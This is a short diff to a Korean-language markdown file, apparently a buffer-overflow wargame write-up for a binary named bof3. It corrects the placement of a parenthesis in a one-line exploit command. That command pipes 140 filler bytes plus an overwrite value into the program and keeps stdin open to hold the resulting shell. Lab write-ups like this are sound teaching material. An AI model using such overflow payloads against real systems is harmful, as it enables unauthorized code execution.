@@ -9,6 +9,6 @@
 터미널에 입력해야 하는 명령은 다음과 같다.
 
 ``` bash
-$ (python -c 'print "a"*140+"\x61\x00\x00\x00"'; cat | ./bof3 )
+$ (python -c 'print "a"*140+"\x61\x00\x00\x00"'; cat) | ./bof3 
 ```
 
